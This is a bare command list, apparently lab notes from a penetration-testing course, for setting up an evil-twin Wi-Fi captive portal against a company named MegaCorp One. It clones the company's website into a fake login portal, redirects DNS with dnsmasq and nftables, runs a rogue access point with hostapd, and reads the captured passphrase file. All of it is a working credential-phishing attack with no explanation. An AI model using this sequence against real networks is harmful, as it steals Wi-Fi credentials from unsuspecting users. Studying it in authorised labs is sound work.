```
sudo apt install apache2 libapache2-mod-php
wget -r -l2 https://www.megacorpone.com
/var/www/html/portal/index.php
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
/var/www/html/portal/login_check.php

sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
sudo apt install dnsmasq
mco-dnsmasq.conf
sudo dnsmasq --conf-file=mco-dnsmasq.conf
sudo tail /var/log/syslog | grep dnsmasq
sudo netstat -lnp

sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53

/etc/apache2/sites-enabled/000-default.conf > mod_rewrite/mod_alias
sudo a2enmod rewrite
sudo a2enmod alias
systemctl restart apache2

/etc/apache2/sites-enabled/000-default.conf > SSL
sudo a2enmod ssl
sudo systemctl restart apache2

nano mco-hostapd.conf
sudo hostapd -B mco-hostapd.conf
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
sudo tail -f /var/log/apache2/access.log
sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt
```
